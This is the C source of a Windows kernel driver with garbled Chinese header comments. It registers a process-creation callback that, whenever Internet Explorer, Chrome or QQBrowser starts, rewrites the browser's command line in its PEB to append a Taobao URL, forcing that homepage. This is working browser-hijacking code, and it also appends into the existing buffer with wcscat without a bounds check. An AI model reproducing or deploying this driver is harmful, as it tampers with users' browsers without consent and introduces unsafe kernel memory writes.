/*************************************************
Copyright (C), 2009-2012    , Level Chip Co., Ltd.
�ļ���:	main.c
��  ��:	Ǯ��      �汾: V0.0.1     �½�����: 2025.01.26
��  ��: ���������������ҳ
��  ע: 
�޸ļ�¼:

  1.  ����: 2025.01.26
	  ����: Ǯ��
	  ����:
		  1) ��Ϊģ���һ���汾��
	  �汾:V0.0.1

*************************************************/

#include <ntifs.h>
#include <ntddk.h>

#include "ExportAPI.h"

VOID Create_Process_Notify_Routine(_In_ HANDLE ParentId, _In_ HANDLE ProcessId,	_In_ BOOLEAN Create)
{
	if (!Create)
	{
		KdPrint(("�Ǵ�������\n"));
		return;
	}

	//ֻ������̴��������

	NTSTATUS lNTStatus = STATUS_SUCCESS;
	PEPROCESS ptPeProcess = NULL;
	KAPC_STATE tKApc_State = { 0 };
	PPEB ptPeb = NULL;

	lNTStatus = PsLookupProcessByProcessId(ProcessId, &ptPeProcess);
	if (!NT_SUCCESS(lNTStatus))
	{
		KdPrint(("PsLookupProcessByProcessId is err\n"));
		return;
	}

	if ((_strnicmp(PsGetProcessImageFileName(ptPeProcess), "iexplore.exe", strlen("iexplore.exe")) == 0) ||
		(_strnicmp(PsGetProcessImageFileName(ptPeProcess), "chrome.exe", strlen("chrome.exe")) == 0) ||
		(_strnicmp(PsGetProcessImageFileName(ptPeProcess), "QQBrowser.exe", strlen("QQBrowser.exe")) == 0))
	{
		ptPeb = PsGetProcessPeb(ptPeProcess);
		if (!ptPeb)
		{
			KdPrint(("PsGetProcessPeb is err\n"));
			return;
		}

		KeStackAttachProcess(ptPeProcess, &tKApc_State);

		if (ptPeb->ProcessParameters->CommandLine.Length - ptPeb->ProcessParameters->ImagePathName.Length == 70)//70Ϊ�鿴dbgview�ó���qq���������ʱ�������в����ĳ�����Ϣ
		{
			UNICODE_STRING tCommandLine;
			PWCHAR pwchCommandLineBuf = ptPeb->ProcessParameters->CommandLine.Buffer;

			wcscat(pwchCommandLineBuf, L" http://www.taobao.com");
			RtlInitUnicodeString(&tCommandLine, pwchCommandLineBuf);

			ptPeb->ProcessParameters->CommandLine = tCommandLine;

			KdPrint(("Lock home page is suc\n"));
		}
		else
		{
			KdPrint(("Lock home page is fail, len = %d, %ls\n", 
				ptPeb->ProcessParameters->CommandLine.Length - ptPeb->ProcessParameters->ImagePathName.Length,
				ptPeb->ProcessParameters->CommandLine.Buffer));
		}

		KeUnstackDetachProcess(&tKApc_State);
	}
}

VOID DriverUnload(IN PDRIVER_OBJECT DriverObject)
{
	PsSetCreateProcessNotifyRoutine(Create_Process_Notify_Routine, TRUE);
	KdPrint(("����ж�سɹ�\n"));
}

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath)
{
	NTSTATUS lNTStatus = STATUS_SUCCESS;
	HANDLE hThread = NULL;

	DriverObject->DriverUnload = DriverUnload;

	PsSetCreateProcessNotifyRoutine(Create_Process_Notify_Routine, FALSE);

	KdPrint(("�������سɹ�\n"));

	return lNTStatus;
}



